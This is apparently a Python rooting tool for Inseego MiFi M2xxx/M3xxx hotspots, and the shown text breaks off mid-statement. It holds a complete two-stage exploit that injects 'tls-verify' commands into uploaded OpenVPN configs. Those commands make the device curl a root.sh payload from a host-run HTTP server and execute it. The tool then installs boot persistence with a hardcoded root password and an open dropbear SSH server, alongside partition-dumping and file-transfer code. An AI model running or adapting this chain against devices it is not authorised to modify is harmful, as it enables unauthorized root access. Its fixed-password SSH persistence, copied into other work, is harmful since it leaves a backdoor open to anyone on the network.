#!/usr/bin/env python3
"""
Inseego MiFi M2xxx / M3xxx all in one root, backup and tweak tool
by JoshAtticus

Tested on an M3200 (Telstra, SDX65). Should be universal across M2xxx/M3xxx
devices but only tested on the M3200.


Requirements:  pip install paramiko requests
"""

import functools
import getpass
import hashlib
import http.server
import os
import re
import shlex
import socket
import subprocess
import sys
import tarfile
import tempfile
import threading
import time
from pathlib import Path, PurePosixPath

import paramiko
import requests

try:
    os.system("")  # enable ANSI escapes on legacy Windows consoles
except Exception:
    pass

HOST = "192.168.1.1"
BASE = f"http://{HOST}"
SSH_PORT = 2222
TELNET_PORT = 2323
ROOT_PW = "Root@123"
PAYLOAD_PORT = 8000
PAYLOAD_LOCAL = "payload/root.sh"
FRAMEWORK = "M2xxx/M3xxx"

# ---------------------------------------------------------------- colours ---

RESET = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"


def clear():
    print("\033[2J\033[H", end="")


def banner():
    print(f"""{CYAN}{BOLD}
              _   _     _ _           _     _              
   ___  _   _| |_| |__ | (_)_ __   __| |___| |_ ___  _ __  
  / _ \| | | | __| '_ \| | | '_ \ / _` / __| __/ _ \| '_ \ 
 | (_) | |_| | |_| |_) | | | | | | (_| \__ \ || (_) | |_) |
  \___/ \__,_|\__|_.__/|_|_|_| |_|\__,_|___/\__\___/| .__/ 
                                                    |_|    
{RESET}{DIM}                    Inseego {FRAMEWORK} tool (root / backup / tweak){RESET}""")


def fail(msg):
    print(f"{RED}{BOLD}ERROR: {msg}{RESET}")


def ok(msg):
    print(f"{GREEN}{msg}{RESET}")


def info(msg):
    print(f"{CYAN}{msg}{RESET}")


def warn(msg):
    print(f"{YELLOW}{msg}{RESET}")


# ------------------------------------------------------------- arrow keys ---

def read_key():
    """Returns 'up', 'down', 'enter', 'ctrlc' or the character pressed."""
    if os.name == "nt":
        import msvcrt
        ch = msvcrt.getch()
        if ch in (b"\x00", b"\xe0"):
            arrow = msvcrt.getch().decode(errors="ignore")
            return {"H": "up", "P": "down"}.get(arrow, "")
        if ch == b"\r":
            return "enter"
        if ch == b"\x03":
            return "ctrlc"
        return ch.decode(errors="ignore")
    import termios
    import tty
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    try:
        tty.setraw(fd)
        ch = sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)
    if ch == "\x1b":
        return {"A": "up", "B": "down"}.get(sys.stdin.read(1), "")
    return {"\r": "enter", "\n": "enter", "\x03": "ctrlc"}.get(ch, ch)


def menu(title, options, info_lines=()):
    """Draws an arrow-key menu, returns the chosen index. Ctrl+C = cancel (-1).
    Long lists are windowed to the terminal height so nothing scrolls off the
    top; hidden entries are marked with '... N more' indicator lines."""
    sel = 0
    start = 0
    while True:
        clear()
        banner()
        print(f"{BOLD}{MAGENTA}  {title}{RESET}\n")
        for line in info_lines:
            print(f"  {line}")
        print()
        try:
            rows = os.get_terminal_size().lines
        except OSError:
            rows = 30
        # fixed overhead: banner(8) + title(2) + blank(2) + indicators(2)
        # + footer(2) + slack(2), so the list always fits on one screen
        visible = max(4, rows - len(info_lines) - 18)
        if sel < start:
            start = sel
        elif sel >= start + visible:
            start = sel - visible + 1
        end = start + visible
        if start > 0:
            print(f"  {DIM}... {start} more above{RESET}")
        for i in range(start, min(end, len(options))):
            if i == sel:
                print(f"  {CYAN}{BOLD} > {options[i]}{RESET}")
            else:
                print(f"    {DIM}{options[i]}{RESET}")
        if end < len(options):
            print(f"  {DIM}... {len(options) - end} more below{RESET}")
        print(f"\n  {DIM}[arrows] move   [enter] select   [ctrl+c] back{RESET}")
        key = read_key()
        if key == "ctrlc":
            return -1
        if key == "up":
            sel = (sel - 1) % len(options)
        elif key == "down":
            sel = (sel + 1) % len(options)
        elif key == "enter":
            return sel


def prompt(msg, default=None):
    try:
        val = input(f"  {CYAN}{msg}{RESET}").strip()
    except EOFError:
        return default
    return val or default


def pause(msg="press enter to continue"):
    try:
        input(f"\n  {DIM}{msg}...{RESET}")
    except EOFError:
        pass


# ------------------------------------------------------------ root probing --

def probe_root():
    """(ssh_up, root_authed). SSH is never up on a stock device, so ssh_up
    basically implies we rooted it before. 1.5s connect timeout."""
    s = socket.socket()
    s.settimeout(1.5)
    try:
        s.connect((HOST, SSH_PORT))
        s.close()
    except OSError:
        return False, False
    try:
        cli = ssh_connect(timeout=2)
        cli.close()
        return True, True
    except Exception:
        return True, False


def ssh_connect(timeout=3):
    cli = paramiko.SSHClient()
    cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    cli.connect(HOST, port=SSH_PORT, username="root", password=ROOT_PW,
                look_for_keys=False, allow_agent=False, timeout=timeout,
                banner_timeout=timeout, auth_timeout=timeout)
    return cli


def ssh_exec(cli, cmd, timeout=30):
    _, stdout, stderr = cli.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode(errors="replace").strip()
    rc = stdout.channel.recv_exit_status()
    return rc, out, stderr.read().decode(errors="replace").strip()


def ssh_ensure(cli):
    """Return a live ssh client, reconnecting if the device dropped us.
    Dropbear restarts right after rooting and kills idle sessions, so a
    client that was fine a moment ago can be dead by the time the user
    answers a menu. Re-check instead of crashing on a stale socket."""
    try:
        cli.exec_command("true", timeout=5)[1].read()
        return cli
    except Exception:
        try:
            cli.close()
        except Exception:
            pass
        last = None
        for _ in range(5):
            try:
                cli = ssh_connect()
                cli.exec_command("true", timeout=5)[1].read()
                ok("reconnected over ssh")
                return cli
            except Exception as e:
                last = e
                time.sleep(2)
        fail(f"could not reconnect over ssh: {last}")
        return None


def push_bytes(cli, path, data):
    """Write bytes to a device path via exec channel (dropbear has no sftp)."""
    chan = cli.get_transport().open_session()
    chan.exec_command(f"cat > {path}")
    chan.sendall(data)
    chan.shutdown_write()
    return chan.recv_exit_status()


# ---------------------------------------------------------- file transfers --

def pull_from_device(cli, remote_path, out_dir="pulled"):
    """Pull any file or folder off the device as a streamed tar and unpack it.
    tar czf - runs on the device so /tmp never has to hold the archive."""
    remote_path = remote_path.strip()
    expected = remote_path.strip("/")
    name = expected.replace("/", "_") or "root"
    out_dir = Path(out_dir)
    out_dir.mkdir(parents=True, exist_ok=True)
    tarball = out_dir / f"{name}.tar.gz"

    show_device_screen(cli, "operation-inprogress")
    print(f"  {CYAN}streaming {remote_path} -> {tarball}{RESET}")
    _, stdout, _ = cli.exec_command(f"tar czf - {shlex.quote(remote_path)}")
    with open(tarball, "wb") as f:
        while True:
            chunk = stdout.read(1 << 16)
            if not chunk:
                break
            f.write(chunk)
    rc = stdout.channel.recv_exit_status()
    if rc != 0 or tarball.stat().st_size == 0:
        fail(f"tar failed on device (exit {rc}) - does the path exist?")
        return None

    dest = out_dir / name
    skipped = 0

    def _pull_filter(member, path):
        # device trees are full of absolute symlinks (/sdcard -> /mnt/sdcard)
        # and dev nodes that the stock data filter aborts on. none of that
        # matters for a pull-to-PC copy, so skip those members instead.
        nonlocal skipped
        if member.issym() or member.islnk() or member.ischr() \
                or member.isblk() or member.isfifo():
            skipped += 1
            return None
        return tarfile.data_filter(member, path)

    with tarfile.open(tarball, "r:gz") as tf:
        members = tf.getmembers()
        for m in members:
            if not (m.name == expected or m.name.startswith(expected + "/")):
                fail(f"unexpected path in tar, refusing to extract: {m.name}")
                return None
        try:
            tf.extractall(dest, filter=_pull_filter)
        except TypeError:
            # paths already validated above, so the pre-3.12 call is safe
            tf.extractall(dest)

    files = [m for m in members if m.isfile()]
    ok(f"pulled {len(files)} files -> {dest}"
       + (f" ({skipped} symlinks/dev nodes skipped)" if skipped else ""))
    for m in sorted(files, key=lambda m: m.name):
        print(f"    {m.name}  ({m.size} B)")
    show_device_screen(cli, "operation-done")
    return dest


def push_to_device(cli, local_path, remote_path, make_exec=False):
    """Push a local file or folder tree to the device. The tar is built on the
    PC (Windows tarfile has no gzip streaming) and piped straight into
    'tar xzf -' on the device. Arcname is derived from the remote path so the
    file lands exactly where you asked."""
    local = Path(local_path)
    remote_path = remote_path.rstrip("/")
    base = str(Path(remote_path).parent)
    arcname = Path(remote_path).name if local.is_file() else (
        Path(remote_path).name or local.name)

    show_device_screen(cli, "operation-inprogress")
    cmd = f"mkdir -p {shlex.quote(base)} && tar xzf - -C {shlex.quote(base)}"
    with tempfile.TemporaryDirectory() as tmp:
        tarball = Path(tmp) / "push.tar.gz"
        with tarfile.open(tarball, "w:gz") as tf:
            tf.add(local, arcname=arcname)
            want = sum(1 for m in tf.getmembers() if m.isfile())
        chan = cli.get_transport().open_session()
        chan.exec_command(cmd)
        with open(tarball, "rb") as f:
            while True:
                chunk = f.read(1 << 16)
                if not chunk:
                    break
                chan.sendall(chunk)
        chan.shutdown_write()
        rc = chan.recv_exit_status()
    if rc != 0:
        fail(f"push failed on device (exit {rc})")
        return False

    # verify what actually landed, trust nothing
    if local.is_file():
        _, out, _ = ssh_exec(cli, f"md5sum {shlex.quote(remote_path)}")
        local_md5 = hashlib.md5(local.read_bytes()).hexdigest()
        if out.split()[0] != local_md5:
            fail("md5 mismatch after push!")
            return False
    else:
        _, out, _ = ssh_exec(cli, f"find {shlex.quote(remote_path)} -type f | wc -l")
        if int(out or -1) != want:
            fail(f"file count mismatch after push (device {out}, local {want})")
            return False
    if make_exec:
        ssh_exec(cli, f"chmod +x {shlex.quote(remote_path)}")
    ok(f"pushed {local} -> {remote_path} (verified)")
    show_device_screen(cli, "operation-done")
    return True


def device_list_dir(cli, path):
    """[(name, is_dir)] for a device path, dirs sorted first. None = bad path."""
    rc, out, err = ssh_exec(cli, f"ls -A1p {shlex.quote(path)} 2>/dev/null")
    if rc != 0:
        return None
    entries = []
    for line in out.splitlines():
        if not line:
            continue
        if line.endswith("/"):
            entries.append((line.rstrip("/"), True))
        else:
            entries.append((line, False))
    return sorted(entries, key=lambda e: (not e[1], e[0].lower()))


def flow_browse_pull(cli, out_dir="pulled"):
    """Arrow-key file browser over the device filesystem. Enter on a folder
    opens it, enter on a file pulls it straight away."""
    start = prompt("start browsing at:", "/") or "/"
    path = start
    while True:
        entries = device_list_dir(cli, path)
        if entries is None:
            fail(f"can't list {path}, jumping back to {start}")
            pause()
            path = start
            continue
        opts = [f"Pull this whole folder ({path})", ".. (up)"]
        opts += [n + ("/" if d else "") for n, d in entries]
        sel = menu("Files: browse", opts, info_lines=[
            f"device path: {BOLD}{path}{RESET}",
            f"{DIM}enter on a folder = open it, enter on a file = pull it{RESET}",
            f"{DIM}pulls land in {out_dir}/{RESET}",
        ])
        if sel == -1:
            return
        if sel == 0:
            pull_from_device(cli, path, out_dir)
            pause()
            continue
        if sel == 1:
            if path.rstrip("/") == "":
                continue  # already at /
            parent = str(PurePosixPath(path).parent)
            path = parent if parent != "" else "/"
            continue
        name, is_dir = entries[sel - 2]
        full = path.rstrip("/") + "/" + name
        if is_dir:
            path = full
            continue
        clear()
        banner()
        print()
        pull_from_device(cli, full, out_dir)
        pause()


def flow_files():
    clear()
    banner()
    print(f"  {BOLD}{MAGENTA}Files (push / pull over ssh){RESET}\n")
    up, authed = probe_root()
    if not authed:
        fail("root required (run Rooting first)")
        pause()
        return
    try:
        cli = ssh_connect()
    except Exception as e:
        fail(f"ssh failed: {e}")
        pause()
        return
    try:
        while True:
            sel = menu("Files", [
                "Browse device & pull (file browser)",
                "Pull a path (type it in)",
                "Push file/folder to device",
                "Back",
            ], info_lines=[
                f"{DIM}pulls land in pulled/ (device path becomes the subfolder).{RESET}",
                f"{DIM}pushes stream a tar into the device, md5-verified for files.{RESET}",
            ])
            if sel in (-1, 3):
                return
            clear()
            banner()
            print()
            if sel == 0:
                flow_browse_pull(cli)
            elif sel == 1:
                remote = prompt("remote path to pull:", "/WEBSERVER")
                if not remote:
                    continue
                out = prompt("local folder:", "pulled")
                pull_from_device(cli, remote, out)
            elif sel == 2:
                local = prompt("local file/folder to push:")
                if not local or not Path(local).exists():
                    fail(f"{local or '(empty)'} not found")
                    pause()
                    continue
                remote = prompt("remote destination path (full path):")
                if not remote:
                    continue
                warn(f"this overwrites {remote} on the device.")
                warn("init scripts are fine (restore from .pre-root), but never")
                warn("write into the flash partitions - those are mtd, not files.")
                if menu("Push now?", ["Cancel", "Push"]) != 1:
                    continue
                make_exec = menu("Make it executable (chmod +x)?",
                                 ["No", "Yes (for scripts)"]) == 1
                push_to_device(cli, local, remote, make_exec=make_exec)
            pause()
    finally:
        cli.close()


def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((HOST, 80))
        return s.getsockname()[0]
    finally:
        s.close()


# ------------------------------------------------------------- web client ---

def check_server():
    """The MiFi WebUI identifies itself with a 'Server: MiFi' header."""
    try:
        r = requests.get(BASE + "/", timeout=3)
    except requests.RequestException:
        return False, "no response. are you connected to the hotspot?"
    server = r.headers.get("Server", "")
    if "mifi" not in server.lower():
        return False, f"expected 'Server: MiFi', got '{server or 'none'}'"
    return True, server


def device_model(session):
    try:
        r = session.get(BASE + "/", timeout=3)
        m = re.search(r"<title>(.*?)</title>", r.text, re.IGNORECASE)
        return m.group(1).strip() if m else "unknown"
    except requests.RequestException:
        return "unknown"


def web_login(session, admin_pw):
    """The WebUI never sends the plaintext admin password. It sends
    sha1(password + gSecureToken). The token is per-page and rotates, so
    scrape it fresh from /login/ every time."""
    r = session.get(BASE + "/login/", timeout=5,
                    headers={"X-Requested-With": "XMLHttpRequest"})
    m = (re.search(r'var secToken = "([0-9a-f]{40})"', r.text)
         or re.search(r'name="gSecureToken" value="([0-9a-f]{40})"', r.text))
    if not m:
        return False, "could not find gSecureToken on the login page"
    token = m.group(1)
    sha = hashlib.sha1((admin_pw + token).encode()).hexdigest()
    r = session.post(BASE + "/submitLogin/",
                     data={"shaPassword": sha, "gSecureToken": token},
                     timeout=5,
                     headers={"X-Requested-With": "XMLHttpRequest"})
    if r.status_code != 200:
        return False, f"login rejected (HTTP {r.status_code}). wrong admin password?"
    # the submitLogin response echoes gIsLoggedIn:0 regardless of outcome -
    # the real answer is whether /vpn/ now serves the admin-only page
    r = session.get(BASE + "/vpn/", timeout=5)
    if re.search(r'isloggedIn = "1"', r.text) or 'name="gSecureToken" value=' in r.text:
        return True, token
    return False, "wrong admin password (session not authenticated)"


def vpn_token(session):
    r = session.get(BASE + "/vpn/", timeout=5)
    m = (re.search(r'name="gSecureToken" value="([0-9a-f]{40})"', r.text)
         or re.search(r'"gSecureToken":"([0-9a-f]{40})"', r.text))
    return m.group(1) if m else None


def vpn_clear(session, token):
    return session.post(BASE + "/vpn/clearVPNSettings/",
                        data={"gSecureToken": token}, timeout=10,
                        headers={"X-Requested-With": "XMLHttpRequest"})


def vpn_upload(session, token, filename, content):
    return session.post(BASE + "/vpn/",
                        data={"gSecureToken": token, "fileNames": filename,
                              "vpnUserName": "a", "vpnPassword": "a"},
                        files={"filesList": (filename, content,
                                             "application/octet-stream")},
                        timeout=20)


def vpn_connect(session, token):
    return session.post(BASE + "/vpn/connect/",
                        data={"gSecureToken": token}, timeout=10,
                        headers={"X-Requested-With": "XMLHttpRequest"})


# --------------------------------------------------- payload http server ----

class _PayloadHandler(http.server.SimpleHTTPRequestHandler):
    ps = None

    def do_GET(self):
        if self.path.split("?")[0] == "/payload/root.sh":
            self.ps.fetched.set()
        super().do_GET()

    def log_message(self, *args):
        pass


class PayloadServer(threading.Thread):
    """Serves the repo root so the device can fetch /payload/root.sh,
    and flags the moment the device actually downloads it."""

    def __init__(self):
        super().__init__(daemon=True)
        self.fetched = threading.Event()
        self.httpd = None

    def run(self):
        handler = type("_H", (_PayloadHandler,), {"ps": self})
        self.httpd = http.server.ThreadingHTTPServer(("0.0.0.0", PAYLOAD_PORT), handler)
        self.httpd.serve_forever()

    def stop(self):
        if self.httpd:
            self.httpd.shutdown()


# Base .ovpn search paths. The first hit containing a 'remote' line wins.
OVPN_SEARCH = [
    "ovpn",                                            # bundled NordVPN sample
    "local",                                          # your own configs (gitignored)
    ".",                                              # repo-local configs
]


def find_base_ovpn():
    """(path, text) of the first usable config, or (None, None).
    Exploit lines are stripped later, so even previous stage profiles work."""
    seen = set()
    for d in OVPN_SEARCH:
        d = Path(d)
        if not d.exists():
            continue
        for f in sorted(d.glob("*.ovpn")):
            if f.resolve() in seen:
                continue
            seen.add(f.resolve())
            try:
                text = f.read_text(errors="replace")
            except OSError:
                continue
            if "remote " in text:
                return f, text
    return None, None


def build_stage_configs(base_text, local_ip):
    """Strip any exploit lines from the base config (it may be a previous
    stage profile), then append ours. The tab on tls-verify is sacred."""
    lines = [l for l in base_text.splitlines()
             if l.strip() != "script-security 2"
             and not l.strip().startswith("tls-verify")]
    base = "\n".join(lines).rstrip() + "\n\n"
    stage1 = base + (
        "script-security 2\n"
        f'\ttls-verify "/usr/bin/curl -o /tmp/root.sh '
        f'http://{local_ip}:{PAYLOAD_PORT}/payload/root.sh"\n'
    )
    stage2 = base + (
        "script-security 2\n"
        '\ttls-verify "/bin/sh /tmp/root.sh"\n'
    )
    return stage1, stage2


# ----------------------------------------------------------------- flows ----

def flow_root(state):
    clear()
    banner()
    print(f"  {BOLD}{MAGENTA}Rooting (OpenVPN tls-verify injection){RESET}\n")

    up, authed = probe_root()
    if authed:
        warn("root SSH is already up. re-running the exploit is harmless (it")
        warn("just re-applies the password and re-starts dropbear), so test away.")
        if menu("Run the exploit again?", ["Cancel", "Run it anyway"]) != 1:
            return
        clear()
        banner()
        print()

    if not Path(PAYLOAD_LOCAL).exists():
        fail(f"{PAYLOAD_LOCAL} not found next to this script")
        pause()
        return

    warn("You need a working OpenVPN client config (.ovpn) that the device can")
    warn("connect to. Credentials do NOT need to be valid")
    warn("THE DEVICE MUST HAVE A WORKING INTERNET CONNECTION FOR THE EXPLOIT TO SUCCEED")

    auto_path, auto_text = find_base_ovpn()
    if auto_path:
        info(f"auto-selected base config: {auto_path}")
        default_base = str(auto_path)
    else:
        default_base = "m3200-stage1 copy.ovpn"
        warn("no .ovpn found automatically, please enter a path manually")
    base_path = prompt(f"base .ovpn [enter = {default_base}]:", default_base)
    base_file = Path(base_path)
    if base_file.exists():
        base_text = base_file.read_text(errors="replace")
    elif base_path == default_base and auto_text:
        base_text = auto_text
    else:
        fail(f"{base_path} not found")
        pause()
        return
    if "remote " not in base_text:
        fail("that file doesn't look like an OpenVPN config (no 'remote' line)")
        pause()
        return

    local_ip = get_local_ip()
    info(f"your LAN IP (payload server): {local_ip}:{PAYLOAD_PORT}")
    warn("default admin password = the default WiFi password (also shown on the device in")
    warn("Menu > Settings > Advanced Settings).")
    admin_pw = getpass.getpass("  admin password: ")
    info("logging into the WebUI...")

    session = requests.Session()
    oklogin, msg = web_login(session, admin_pw)
    if not oklogin:
        fail(f"WebUI login failed: {msg}")
        pause()
        return
    ok("logged into WebUI")

    stage1, stage2 = build_stage_configs(base_text, local_ip)

    ps = PayloadServer()
    ps.start()
    info(f"payload server listening on :{PAYLOAD_PORT} (serving {Path.cwd()})")

    try:
        # ---- stage 1: plant /tmp/root.sh
        info("uploading stage 1...")
        token = vpn_token(session)
        if not token:
            fail("could not scrape gSecureToken from /vpn/. are you logged in?")
            return
        vpn_clear(session, token)
        token = vpn_token(session)
        r = vpn_upload(session, token, "mifi_stage1.ovpn", stage1)
        info(f"stage 1 uploaded (HTTP {r.status_code})")
        token = vpn_token(session)
        info("executing stage 1...")
        vpn_connect(session, token)
        ok("stage 1 executed! waiting for the device to fetch the payload...")

        if not ps.fetched.wait(30):
            fail("device didn't fetch payload within 30 seconds, aborting")
            fail("the device needs an internet connection (cellular data) to")
            fail("reach the VPN server. without the handshake there is no payload.")
            fail("other causes: VPN server down, firewall blocking :8000, wrong IP")
            return
        ok("device fetched the payload!")

        # ---- stage 2: execute it
        token = vpn_token(session)
        info("preparing to execute stage 2...")
        vpn_clear(session, token)
        token = vpn_token(session)
        info("uploading stage 2...")
        vpn_upload(session, token, "mifi_stage2.ovpn", stage2)
        token = vpn_token(session)
        info("executing stage 2...")
        vpn_connect(session, token)
        ok("stage 2 executed! waiting for ssh...")

        # ---- wait for dropbear
        for i in range(45):
            up, authed = probe_root()
            if authed:
                break
            time.sleep(2)
        if not authed:
            fail("uh oh, ssh never came up, check the VPN log in the WebUI")
            return

        ok(f"root acquired! ssh -p 2222 root@{HOST} (password {ROOT_PW})")
    finally:
        ps.stop()

    try:
        cli = ssh_connect()
    except Exception as e:
        fail(f"ssh dropped: {e}")
        pause()
        return
    # first ssh of the rooting process: tell the human on the device that
    # the tool is still working (persistence question comes up next)
    show_device_screen(cli, "inprogress")
    sel = menu("Install root persistence now?",
               ["Yes (survives reboots)", "No (later)"], info_lines=[])
    # the user may have sat at that menu while dropbear restarted underneath us
    cli = ssh_ensure(cli)
    if not cli:
        pause()
        return
    if sel == 0 and flow_persistence(cli):
        show_device_screen(cli, "success")
    else:
        show_device_screen(cli, "temproot-success")
    cli.close()
    pause()


def show_device_screen(cli, name):
    """Push assets/<name>.png to the device and put it on the 320x240 screen.
    Silent on success - the device screen IS the feedback. The success image
    has its Yay! button positioned right over the device UI's
    connected-devices button, so tapping it opens the menu through the touch
    layer, no ssh needed afterwards."""
    src = Path("assets") / f"{name}.png"
    if not src.exists():
        warn(f"{src} missing, skipping the {name} screen")
        return
    data = src.read_bytes()
    if data[25] == 6:  # RGBA. mifi_display_png only accepts RGB
        try:
            import io
            from PIL import Image
            buf = io.BytesIO()
            Image.open(src).convert("RGB").save(buf, "PNG")
            data = buf.getvalue()
        except ImportError:
            warn(f"{name}.png is RGBA and PIL isn't installed, skipping (pip install pillow)")
            return
    ssh_exec(cli, "mkdir -p /data/yay")
    if push_bytes(cli, "/data/yay/yay_1.png", data) == 0:
        ssh_exec(cli, "LD_LIBRARY_PATH=/opt/nvtl/lib /opt/nvtl/bin/mifi_display_png /data/yay/yay_ 1")


PERSISTENCE_MARKER = "# --- root persistence (added by mifi_tool) ---"
PERSISTENCE_FILES = [
    "/opt/nvtl/bin/init-SDX65.sh",     # SDX65 (M3000/M3100/M3200)
    "/opt/nvtl/bin/init-SDX55.sh",     # SDX55 (M2000)
    "/opt/nvtl/bin/syslogd_monitor.sh",
]


def persistence_installed(cli):
    """True if our persistence block is live in any of the init scripts."""
    for cand in PERSISTENCE_FILES:
        _, out, _ = ssh_exec(cli, f"grep -cF '{PERSISTENCE_MARKER}' {cand} 2>/dev/null")
        if out and out != "0":
            return True
    return False


def flow_unroot(cli):
    clear()
    banner()
    print(f"  {BOLD}{MAGENTA}Uninstall root{RESET}\n")
    warn("this removes persistence and stops dropbear/telnetd. The root")
    warn("password stays " + ROOT_PW + " but stock builds have no ssh, so it's")
    warn("only reachable over serial/console. The WebUI is untouched.")
    if menu("Continue?", ["Cancel", "Uninstall"]) != 1:
        return
    MARKER = PERSISTENCE_MARKER
    CANDIDATES = PERSISTENCE_FILES
    target = None
    for cand in CANDIDATES:
        _, out, _ = ssh_exec(cli, f"[ -f {cand} ] && echo yes")
        if out == "yes":
            target = cand
            break
    if not target:
        fail(f"none of {CANDIDATES} exist, nothing to uninstall?")
        return
    _, out, _ = ssh_exec(cli, f"[ -f {target}.pre-root ] && echo yes")
    if out == "yes":
        rc, _, err = ssh_exec(cli, f"cp {target}.pre-root {target}")
        if rc == 0:
            ok(f"restored {target} from .pre-root backup")
        else:
            fail(f"restore failed: {err}. DO NOT reboot")
            return
    else:
        _, raw, _ = ssh_exec(cli, f"cat {target}")
        lines = [l for l in raw.splitlines()
                 if l.strip() != MARKER
                 and "passwd root" not in l
                 and "dropbear -r /etc/dropbear" not in l]
        chan = cli.get_transport().open_session()
        chan.exec_command(f"cat > {target}")
        chan.sendall(("\n".join(lines) + "\n").encode())
        chan.shutdown_write()
        if chan.recv_exit_status() != 0:
            fail("failed to clean init script. DO NOT reboot")
            return
        ok(f"persistence block stripped from {target}")
    # put the unroot screen up while ssh still works, then kill services last.
    # dropping dropbear kills our own ssh session, so detach the kill into a
    # background sleep to let the response go out first
    show_device_screen(cli, "unroot-success")
    ssh_exec(cli, "nohup sh -c 'sleep 1; kill $(pidof dropbear) $(pidof telnetd)' >/dev/null 2>&1 &")
    ok("root uninstalled. ssh/telnet are down, device behaves as stock")


def flow_persistence(cli):
    """Returns True only if persistence is verifiably installed afterwards."""
    MARKER = PERSISTENCE_MARKER
    CANDIDATES = PERSISTENCE_FILES
    block = [
        MARKER,
        'echo -e "Root@123\\nRoot@123" | passwd root',
        "/usr/sbin/dropbear -r /etc/dropbear/dropbear_rsa_key -p 2222",
    ]
    target = None
    for cand in CANDIDATES:
        rc, out, _ = ssh_exec(cli, f"[ -f {cand} ] && echo yes")
        if out == "yes":
            target = cand
            break
    if not target:
        fail(f"none of {CANDIDATES} exist on this device")
        return False

    _, raw, _ = ssh_exec(cli, f"cat {target}")
    if MARKER in raw:
        ok(f"persistence already present in {target}")
        return True
    lines = [l for l in raw.splitlines()
             if l.strip() != MARKER
             and "passwd root" not in l
             and "dropbear -r /etc/dropbear" not in l]
    ssh_exec(cli, f"[ -f {target}.pre-root ] || cp {target} {target}.pre-root")
    # insert before the first 'exit 0' or the block never runs
    try:
        idx = next(i for i, l in enumerate(lines) if l.strip() == "exit 0")
    except StopIteration:
        idx = len(lines)
    lines[idx:idx] = block
    chan = cli.get_transport().open_session()
    chan.exec_command(f"cat > {target}")
    chan.sendall(("\n".join(lines) + "\n").encode())
    chan.shutdown_write()
    rc = chan.recv_exit_status()
    if rc != 0:
        fail("failed to write init script. persistence NOT installed")
        return False
    _, out, _ = ssh_exec(cli, f"grep -c dropbear {target}")
    if int(out or 0) >= 1:
        ok(f"persistence installed in {target} (backup: {target}.pre-root)")
        return True
    else:
        fail("verification failed. DO NOT reboot until this is fixed")
        return False


def flow_backup():
    clear()
    banner()
    print(f"  {BOLD}{MAGENTA}Backup (dump all MTD partitions){RESET}\n")
    up, authed = probe_root()
    if not authed:
        fail("root required (run Rooting first)")
        pause()
        return

    cli = ssh_connect()
    out_dir = Path("backup")
    out_dir.mkdir(exist_ok=True)

    rc, mtd, _ = ssh_exec(cli, "cat /proc/mtd")
    parts = []
    for line in mtd.splitlines()[1:]:
        m = re.match(r'mtd(\d+):\s+([0-9a-fA-F]+)\s+[0-9a-fA-F]+\s+"(.*)"', line.strip())
        if m:
            parts.append((int(m.group(1)), int(m.group(2), 16), m.group(3)))
    if not parts:
        fail("could not parse /proc/mtd")
        pause()
        return

    warn("these dumps are your ONLY recovery path (no firehose exists).")
    warn("copy the backup/ folder somewhere safe when this finishes.\n")

    show_device_screen(cli, "operation-inprogress")

    bad = 0
    for num, size, name in parts:
        out = out_dir / f"mtd{num}_{name}.bin"
        print(f"  {CYAN}mtd{num}{RESET} {name:<15} {size / 1048576:7.1f} MiB ... ", end="", flush=True)
        _, stdout, _ = cli.exec_command(f"dd if=/dev/mtdblock{num} bs=4096")
        with open(out, "wb") as f:
            while True:
                chunk = stdout.read(1 << 20)
                if not chunk:
                    break
                f.write(chunk)
        rc = stdout.channel.recv_exit_status()
        actual = out.stat().st_size
        if rc != 0 or actual != size:
            print(f"{RED}FAILED (rc={rc}, {actual} bytes){RESET}")
            bad += 1
        else:
            print(f"{GREEN}ok{RESET}")

    if bad:
        fail(f"{bad} partitions failed, re-run the backup")
    else:
        ok(f"all {len(parts)} partitions dumped to {out_dir}/, zero warnings")
        show_device_screen(cli, "operation-done")
    cli.close()
    pause()


def ensure_ssh_key():
    """Install a passwordless RSA key on the device so ssh.exe stops asking
    for Root@123 every time. dropbear here only speaks legacy ssh-rsa
    signatures, which is why the key must be RSA. We use a dedicated mifi_rsa
    pair so we never touch (or clobber) the user's own keys."""
    ssh_dir = Path.home() / ".ssh"
    ssh_dir.mkdir(exist_ok=True)
    key = ssh_dir / "mifi_rsa"
    if not key.exists():
        subprocess.run(["ssh-keygen", "-t", "rsa", "-b", "2048", "-N", "",
                        "-f", str(key), "-q"], check=True)
        ok("generated a new ssh key for this device")
    pub_file = key.with_suffix(".pub")
    if not pub_file.exists():
        # private key exists but public half is gone, derive it
        r = subprocess.run(["ssh-keygen", "-y", "-P", "", "-f", str(key)],
                           capture_output=True, text=True)
        if r.returncode != 0:
            raise RuntimeError("cannot derive public key (is mifi_rsa passphrase protected?)")
        pub_file.write_text(r.stdout.strip() + "\n")
    pub = pub_file.read_text().strip()
    blob = pub.split()[1]
    cli = ssh_connect()
    ssh_exec(cli, "mkdir -p /etc/dropbear && touch /etc/dropbear/authorized_keys")
    _, out, _ = ssh_exec(cli, f"grep -cF '{blob}' /etc/dropbear/authorized_keys")
    if out != "1":
        ssh_exec(cli, f"echo '{pub}' >> /etc/dropbear/authorized_keys && "
                      f"chmod 600 /etc/dropbear/authorized_keys")
        ok("installed your ssh key on the device, no more password prompts")
    cli.close()
    return key


def flow_ssh_shell():
    clear()
    banner()
    print(f"  {BOLD}{MAGENTA}SSH shell{RESET}\n")
    info(f"root password: {BOLD}{ROOT_PW}{RESET}")
    print(f"""
  {YELLOW}{BOLD}DO NOT:{RESET}
   * flash/erase {RED}boot, abl, xbl, sbl, tz{RESET} or anything bootloader-ish
     (there is no signed firehose, a bad flash there is an unrecoverable brick)
   * cat binaries to the terminal (binary output can hang the session)
   * restore someone else's /persist dump (TrustZone encrypts the WebUI
     passwords per device, a foreign dump crashes the WebUI)
  {GREEN}DO:{RESET}
   * dd all mtdblocks to your PC before changing anything
   * use 'modem2_cli' (with LD_LIBRARY_PATH=/opt/nvtl/lib) for modem tweaks

  type {BOLD}exit{RESET} to return to the menu
""")
    try:
        key = ensure_ssh_key()
    except Exception as e:
        warn(f"key setup failed ({e}), falling back to password auth")
        key = None
    cmd = ["ssh", "-p", str(SSH_PORT),
